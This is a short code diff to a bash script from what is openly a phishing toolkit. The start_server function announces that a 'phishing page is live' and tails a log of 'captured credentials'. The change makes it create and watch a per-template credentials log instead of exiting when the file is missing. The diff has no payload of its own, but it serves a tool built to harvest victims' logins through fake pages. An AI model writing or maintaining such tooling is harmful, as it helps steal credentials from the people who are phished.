@@ -54,13 +54,18 @@ start_server() {
     echo -e "\nPhishing page is live at: \033[1;34mhttp://127.0.0.1:$port\033[0m"
     echo -e "Press \033[1;31mCtrl+C\033[0m to stop the server.\n"
 
+    # Create the log directory if it doesn't exist
+    mkdir -p logs
+
     # Monitor the PHP server logs for captured credentials
-    if [ -f templates/$template/websites/$template.php ]; then
+    if [ -f logs/$template.log ]; then
         echo -e "Monitoring captured credentials...\n"
-        tail -f templates/$template/websites/$template.php
+        tail -f logs/$template.log
     else
-        echo -e "Log file not found. Please check if the template path is correct."
-        exit 1
+        echo -e "Log file not found. Creating log file..."
+        touch logs/$template.log
+        echo -e "Log file created. Monitoring captured credentials...\n"
+        tail -f logs/$template.log
     fi
 }
 
